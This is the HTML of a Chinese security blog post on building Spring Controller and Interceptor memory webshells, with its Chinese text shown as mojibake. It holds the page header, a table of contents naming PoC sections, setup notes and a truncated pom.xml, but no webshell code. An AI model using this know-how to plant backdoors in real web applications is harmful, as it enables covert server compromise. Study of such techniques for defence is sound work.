<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Springå†…å­˜é©¬ | Jiecub3</title>
<meta name="keywords" content="">
<meta name="description" content="å‰è¨€: ä¸å»ºè®®çœ‹Controllerå†…å­˜é©¬ï¼Œå› ä¸ºå‰é¢å®Œå…¨æ˜¯ç¬”è€…è‡ªå·±åœ¨æ‘¸ç´¢ï¼Œåé¢è¿˜é”™äº†hhï¼ˆå¤ªèœå•¦ï¼‰ã€‚è·Ÿæˆ‘è¿™ä¸ªèµ°çš„è¯å¯èƒ½ä¼šè´¹åŠ›ä¸è®¨å¥½ã€‚ Inter">
<meta name="author" content="Jiecub3">
<link rel="canonical" href="https://Jiecub3.github.io/zh/posts/java/%E5%86%85%E5%AD%98%E9%A9%AC/spring%E5%86%85%E5%AD%98%E9%A9%AC/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.6498a9db1bad4c0d045c3aa5ba217809694eb596cf8fff3516fcb871a2dfe03e.css" integrity="sha256-ZJip2xutTA0EXDqluiF4CWlOtZbPj/81Fvy4caLf4D4=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="16x16" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="32x32" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="apple-touch-icon" href="https://Jiecub3.github.io/logo.gif">
<link rel="mask-icon" href="https://Jiecub3.github.io/logo.gif">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="https://Jiecub3.github.io/zh/posts/java/%E5%86%85%E5%AD%98%E9%A9%AC/spring%E5%86%85%E5%AD%98%E9%A9%AC/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="Springå†…å­˜é©¬" />
<meta property="og:description" content="å‰è¨€: ä¸å»ºè®®çœ‹Controllerå†…å­˜é©¬ï¼Œå› ä¸ºå‰é¢å®Œå…¨æ˜¯ç¬”è€…è‡ªå·±åœ¨æ‘¸ç´¢ï¼Œåé¢è¿˜é”™äº†hhï¼ˆå¤ªèœå•¦ï¼‰ã€‚è·Ÿæˆ‘è¿™ä¸ªèµ°çš„è¯å¯èƒ½ä¼šè´¹åŠ›ä¸è®¨å¥½ã€‚ Inter" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://Jiecub3.github.io/zh/posts/java/%E5%86%85%E5%AD%98%E9%A9%AC/spring%E5%86%85%E5%AD%98%E9%A9%AC/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-11-25T20:01:23+08:00" />
<meta property="article:modified_time" content="2024-11-25T20:01:23+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Springå†…å­˜é©¬"/>
<meta name="twitter:description" content="å‰è¨€: ä¸å»ºè®®çœ‹Controllerå†…å­˜é©¬ï¼Œå› ä¸ºå‰é¢å®Œå…¨æ˜¯ç¬”è€…è‡ªå·±åœ¨æ‘¸ç´¢ï¼Œåé¢è¿˜é”™äº†hhï¼ˆå¤ªèœå•¦ï¼‰ã€‚è·Ÿæˆ‘è¿™ä¸ªèµ°çš„è¯å¯èƒ½ä¼šè´¹åŠ›ä¸è®¨å¥½ã€‚ Inter"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://Jiecub3.github.io/zh/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Springå†…å­˜é©¬",
      "item": "https://Jiecub3.github.io/zh/posts/java/%E5%86%85%E5%AD%98%E9%A9%AC/spring%E5%86%85%E5%AD%98%E9%A9%AC/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Springå†…å­˜é©¬",
  "name": "Springå†…å­˜é©¬",
  "description": "å‰è¨€: ä¸å»ºè®®çœ‹Controllerå†…å­˜é©¬ï¼Œå› ä¸ºå‰é¢å®Œå…¨æ˜¯ç¬”è€…è‡ªå·±åœ¨æ‘¸ç´¢ï¼Œåé¢è¿˜é”™äº†hhï¼ˆå¤ªèœå•¦ï¼‰ã€‚è·Ÿæˆ‘è¿™ä¸ªèµ°çš„è¯å¯èƒ½ä¼šè´¹åŠ›ä¸è®¨å¥½ã€‚ Inter",
  "keywords": [
    
  ],
  "articleBody": " å‰è¨€: ä¸å»ºè®®çœ‹Controllerå†…å­˜é©¬ï¼Œå› ä¸ºå‰é¢å®Œå…¨æ˜¯ç¬”è€…è‡ªå·±åœ¨æ‘¸ç´¢ï¼Œåé¢è¿˜é”™äº†hhï¼ˆå¤ªèœå•¦ï¼‰ã€‚è·Ÿæˆ‘è¿™ä¸ªèµ°çš„è¯å¯èƒ½ä¼šè´¹åŠ›ä¸è®¨å¥½ã€‚\nInterceptorå†…å­˜é©¬å¯ä»¥çœ‹ï¼Œæœ‰å‰é¢çš„åŸºç¡€ï¼Œå¾ˆç®€å•å°±æ„é€ å‡ºæ¥äº†\n0x01 ç¯å¢ƒ è¿™é‡Œæˆ‘ä»¬è¦åˆ›å»ºjdk1.8çš„springï¼Œæ–°ç‰ˆideaéœ€è¦è·Ÿæ¢ä¸‹æˆé˜¿é‡Œçš„é“¾æ¥å…·ä½“å¯ä»¥å‚è€ƒä½ç‰ˆæœ¬jdk spring\nè¿™é‡Œé€‰æ‹©springbootç‰ˆæœ¬ï¼Œå’Œspring web\n2.6ä¹‹åçš„ç‰ˆæœ¬å¤ç°ä¸æˆåŠŸï¼Œå†…å­˜é©¬å¯ä»¥æ­£å¸¸æ³¨å…¥ï¼Œä½†æ˜¯è®¿é—®æ—¶æŠ¥é”™\njava.lang.IllegalArgumentException: Expected lookupPath in request attribute \"org.springframework.web.util.UrlPathHelper.PATH\". æŸ¥äº†ä¸€ä¸‹å‘ç°åœ¨springboot 2.6.0ä¹‹åä¸èƒ½æœ‰è‡ªå®šä¹‰æ³¨å†ŒRequestMappingçš„é€»è¾‘ï¼Œåº”è¯¥ä¹Ÿæ˜¯ä¸ºäº†é˜²å¾¡å†…å­˜é©¬ï¼Œé™¤äº†æ·»åŠ é…ç½®ç›®å‰æ²¡æœ‰æ‰¾åˆ°æ¯”è¾ƒå¥½çš„è§£å†³æ–¹æ³•\nhttps://liuyanzhao.com/1503010911382802434.html\nhttps://blog.csdn.net/maple_son/article/details/122572869\nç„¶åå°±å¯ä»¥ç›´æ¥å†™controlleräº†\npom.xml\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e ",
  "wordCount" : "8364",
  "inLanguage": "zh",
  "datePublished": "2024-11-25T20:01:23+08:00",
  "dateModified": "2024-11-25T20:01:23+08:00",
  "author":{
    "@type": "Person",
    "name": "Jiecub3"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://Jiecub3.github.io/zh/posts/java/%E5%86%85%E5%AD%98%E9%A9%AC/spring%E5%86%85%E5%AD%98%E9%A9%AC/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Jiecub3",
    "logo": {
      "@type": "ImageObject",
      "url": "https://Jiecub3.github.io/img/logo.gif"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://Jiecub3.github.io/zh/" accesskey="h" title="Jiecub3 (Alt + H)">Jiecub3</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://Jiecub3.github.io/zh/" title="é¦–é¡µ">
                    <span>é¦–é¡µ</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/archives/" title="å½’æ¡£">
                    <span>å½’æ¡£</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/categories/" title="åˆ†ç±»">
                    <span>åˆ†ç±»</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/search" title="æœç´¢ğŸ”ï¸">
                    <span>æœç´¢ğŸ”ï¸</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/about/" title="å…³äº">
                    <span>å…³äº</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://Jiecub3.github.io/zh/">ğŸ ä¸»é¡µ</a>&nbsp;Â»&nbsp;<a href="https://Jiecub3.github.io/zh/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      Springå†…å­˜é©¬
    </h1>
    <div class="post-meta"><span title='2024-11-25 20:01:23 +0800 CST'>2024-11-25</span>&nbsp;Â·&nbsp;17 åˆ†é’Ÿ&nbsp;Â·&nbsp;Jiecub3

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">ç›®å½•</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#0x01-%e7%8e%af%e5%a2%83" aria-label="0x01 ç¯å¢ƒ">0x01 ç¯å¢ƒ</a></li>
                    <li>
                        <a href="#controller%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="Controllerå†…å­˜é©¬">Controllerå†…å­˜é©¬</a><ul>
                            
                    <li>
                        <a href="#0x02-%e5%88%86%e6%9e%90" aria-label="0x02 åˆ†æ">0x02 åˆ†æ</a></li>
                    <li>
                        <a href="#0x03-%e6%9e%84%e9%80%a0" aria-label="0x03 æ„é€ ">0x03 æ„é€ </a><ul>
                            
                    <li>
                        <a href="#%e8%8a%82%e7%82%b91-%e5%88%a0%e9%99%a4handler%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="èŠ‚ç‚¹1 åˆ é™¤handlerå†…å­˜é©¬">èŠ‚ç‚¹1 åˆ é™¤handlerå†…å­˜é©¬</a></li></ul>
                    </li>
                    <li>
                        <a href="#%e9%97%ae%e9%a2%981-%e4%bc%a0%e5%8f%82" aria-label="é—®é¢˜1 ä¼ å‚">é—®é¢˜1 ä¼ å‚</a><ul>
                            
                    <li>
                        <a href="#poc1" aria-label="poc1">poc1</a></li></ul>
                    </li>
                    <li>
                        <a href="#%e9%97%ae%e9%a2%982-%e8%8e%b7%e5%8f%96%e8%bf%90%e8%a1%8c%e6%97%b6%e7%b1%bb%e5%ae%9e%e4%be%8b" aria-label="é—®é¢˜2 è·å–è¿è¡Œæ—¶ç±»å®ä¾‹">é—®é¢˜2 è·å–è¿è¡Œæ—¶ç±»å®ä¾‹</a><ul>
                            <ul>
                            
                    <li>
                        <a href="#%e5%ad%98%e6%a1%a31-%e4%b8%8a%e4%b8%8b%e6%96%87-no" aria-label="å­˜æ¡£1 ä¸Šä¸‹æ–‡ no">å­˜æ¡£1 ä¸Šä¸‹æ–‡ no</a></li></ul>
                        </ul>
                    </li>
                    <li>
                        <a href="#poc%e6%9e%84%e9%80%a0" aria-label="pocæ„é€ ">pocæ„é€ </a><ul>
                            
                    <li>
                        <a href="#%e5%9d%91%e7%82%b91" aria-label="å‘ç‚¹1">å‘ç‚¹1</a></li>
                    <li>
                        <a href="#%e5%9d%91%e7%82%b92" aria-label="å‘ç‚¹2">å‘ç‚¹2</a></li>
                    <li>
                        <a href="#demo-poc" aria-label="demo poc"><strong>demo poc</strong></a></li>
                    <li>
                        <a href="#%e6%9c%80%e7%bb%88poc%e5%ad%97%e8%8a%82%e7%a0%81%e5%bd%a2%e5%bc%8f" aria-label="æœ€ç»ˆpoc(å­—èŠ‚ç å½¢å¼">æœ€ç»ˆpoc(å­—èŠ‚ç å½¢å¼</a></li></ul>
                    </li>
                    <li>
                        <a href="#0x04-%e6%80%bb%e7%bb%93" aria-label="0x04 æ€»ç»“">0x04 æ€»ç»“</a></li></ul>
                    </li>
                    <li>
                        <a href="#interceptor%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="Interceptorå†…å­˜é©¬">Interceptorå†…å­˜é©¬</a><ul>
                            
                    <li>
                        <a href="#0x01-%e5%88%86%e6%9e%90" aria-label="0x01 åˆ†æ">0x01 åˆ†æ</a><ul>
                            
                    <li>
                        <a href="#%e6%ad%a3%e7%89%87%e5%bc%80%e5%a7%8b" aria-label="æ­£ç‰‡å¼€å§‹">æ­£ç‰‡å¼€å§‹</a></li></ul>
                    </li>
                    <li>
                        <a href="#0x02-%e6%9e%84%e9%80%a0" aria-label="0x02 æ„é€ ">0x02 æ„é€ </a><ul>
                            
                    <li>
                        <a href="#%e9%97%ae%e9%a2%981-abstracthandlermapping" aria-label="é—®é¢˜1 AbstractHandlerMapping">é—®é¢˜1 AbstractHandlerMapping</a></li>
                    <li>
                        <a href="#%e9%97%ae%e9%a2%982-%e7%b1%bb%e5%9e%8b" aria-label="é—®é¢˜2 ç±»å‹">é—®é¢˜2 ç±»å‹</a></li></ul>
                    </li>
                    <li>
                        <a href="#0x03-poc" aria-label="0x03 poc">0x03 poc</a><ul>
                            
                    <li>
                        <a href="#%e9%97%ae%e9%a2%983-url%e8%b7%af%e5%be%84" aria-label="é—®é¢˜3 urlè·¯å¾„">é—®é¢˜3 urlè·¯å¾„</a></li>
                    <li>
                        <a href="#end-poc2" aria-label="end poc2">end poc2</a></li></ul>
                    </li>
                    <li>
                        <a href="#0x04-%e6%80%bb%e7%bb%93-1" aria-label="0x04 æ€»ç»“">0x04 æ€»ç»“</a>
                    </li>
                </ul>
                </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><blockquote>
<p>å‰è¨€: ä¸å»ºè®®çœ‹<code>Controllerå†…å­˜é©¬</code>ï¼Œå› ä¸ºå‰é¢å®Œå…¨æ˜¯ç¬”è€…è‡ªå·±åœ¨æ‘¸ç´¢ï¼Œåé¢è¿˜é”™äº†hhï¼ˆå¤ªèœå•¦ï¼‰ã€‚è·Ÿæˆ‘è¿™ä¸ªèµ°çš„è¯å¯èƒ½ä¼šè´¹åŠ›ä¸è®¨å¥½ã€‚</p>
<p><code>Interceptorå†…å­˜é©¬</code>å¯ä»¥çœ‹ï¼Œæœ‰å‰é¢çš„åŸºç¡€ï¼Œå¾ˆç®€å•å°±æ„é€ å‡ºæ¥äº†</p>
</blockquote>
<h1 id="0x01-ç¯å¢ƒ">0x01 ç¯å¢ƒ<a hidden class="anchor" aria-hidden="true" href="#0x01-ç¯å¢ƒ">#</a></h1>
<p>è¿™é‡Œæˆ‘ä»¬è¦åˆ›å»ºjdk1.8çš„springï¼Œæ–°ç‰ˆideaéœ€è¦è·Ÿæ¢ä¸‹æˆ<strong>é˜¿é‡Œçš„é“¾æ¥</strong>å…·ä½“å¯ä»¥å‚è€ƒ<a href="https://blog.csdn.net/imbzz/article/details/134691177">ä½ç‰ˆæœ¬jdk spring</a></p>
<p><img loading="lazy" src="images/image-20241122164821562.png" alt="image-20241122164821562"  />
</p>
<p>è¿™é‡Œé€‰æ‹©<code>springbootç‰ˆæœ¬</code>ï¼Œå’Œ<code>spring web</code></p>
<p><img loading="lazy" src="images/image-20241122164953770.png" alt="image-20241122164953770"  />
</p>
<blockquote>
<p>2.6ä¹‹åçš„ç‰ˆæœ¬å¤ç°ä¸æˆåŠŸï¼Œå†…å­˜é©¬å¯ä»¥æ­£å¸¸æ³¨å…¥ï¼Œä½†æ˜¯è®¿é—®æ—¶æŠ¥é”™</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">java.lang.IllegalArgumentException: Expected lookupPath in request attribute &#34;org.springframework.web.util.UrlPathHelper.PATH&#34;.
</span></span></code></pre></div><p>æŸ¥äº†ä¸€ä¸‹å‘ç°åœ¨springboot 2.6.0ä¹‹åä¸èƒ½æœ‰è‡ªå®šä¹‰æ³¨å†ŒRequestMappingçš„é€»è¾‘ï¼Œåº”è¯¥ä¹Ÿæ˜¯ä¸ºäº†é˜²å¾¡å†…å­˜é©¬ï¼Œé™¤äº†æ·»åŠ é…ç½®ç›®å‰æ²¡æœ‰æ‰¾åˆ°æ¯”è¾ƒå¥½çš„è§£å†³æ–¹æ³•</p>
<p><a href="https://liuyanzhao.com/1503010911382802434.html">https://liuyanzhao.com/1503010911382802434.html</a></p>
<p><a href="https://blog.csdn.net/maple_son/article/details/122572869">https://blog.csdn.net/maple_son/article/details/122572869</a></p>
<p><img loading="lazy" src="images/image-20241122165302886.png" alt="image-20241122165302886"  />
</p>
<p>ç„¶åå°±å¯ä»¥ç›´æ¥å†™<code>controller</code>äº†</p>
<p><strong>pom.xml</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;project</span> <span class="na">xmlns=</span><span class="s">&#34;http://maven.apache.org/POM/4.0.0&#34;</span> <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">xsi:schemaLocation=</span><span class="s">&#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;modelVersion&gt;</span>4.0.0<span class="nt">&lt;/modelVersion&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>org.example<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>springboot1<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>0.0.1-SNAPSHOT<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;name&gt;</span>springboot1<span class="nt">&lt;/name&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;description&gt;</span>springboot1<span class="nt">&lt;/description&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;properties&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;java.version&gt;</span>1.8<span class="nt">&lt;/java.version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;project.build.sourceEncoding&gt;</span>UTF-8<span class="nt">&lt;/project.build.sourceEncoding&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;project.reporting.outputEncoding&gt;</span>UTF-8<span class="nt">&lt;/project.reporting.outputEncoding&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;spring-boot.version&gt;</span>2.6.13<span class="nt">&lt;/spring-boot.version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/properties&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependencies&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.springframework.boot<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>spring-boot-starter<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.springframework.boot<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>spring-boot-starter-test<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;scope&gt;</span>test<span class="nt">&lt;/scope&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;groupId&gt;</span>com.fasterxml.jackson.core<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jackson-databind<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;version&gt;</span>2.15.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;groupId&gt;</span>com.fasterxml.jackson.core<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jackson-core<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;version&gt;</span>2.15.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;groupId&gt;</span>com.fasterxml.jackson.core<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>jackson-annotations<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;version&gt;</span>2.15.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;groupId&gt;</span>javassist<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>javassist<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;version&gt;</span>3.12.1.GA<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.springframework.boot<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>spring-boot-starter-web<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependencies&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependencyManagement&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;dependencies&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;groupId&gt;</span>org.springframework.boot<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;artifactId&gt;</span>spring-boot-dependencies<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;version&gt;</span>${spring-boot.version}<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;type&gt;</span>pom<span class="nt">&lt;/type&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;scope&gt;</span>import<span class="nt">&lt;/scope&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/dependencies&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependencyManagement&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;build&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;plugins&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;groupId&gt;</span>org.apache.maven.plugins<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;artifactId&gt;</span>maven-compiler-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;version&gt;</span>3.8.1<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;configuration&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="nt">&lt;source&gt;</span>1.8<span class="nt">&lt;/source&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="nt">&lt;target&gt;</span>1.8<span class="nt">&lt;/target&gt;</span>
</span></span><span class="line"><span class="cl">                    <span class="nt">&lt;encoding&gt;</span>UTF-8<span class="nt">&lt;/encoding&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;/configuration&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/plugin&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;plugin&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;groupId&gt;</span>org.springframework.boot<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;artifactId&gt;</span>spring-boot-maven-plugin<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;version&gt;</span>${spring-boot.version}<span class="nt">&lt;/version&gt;</span>
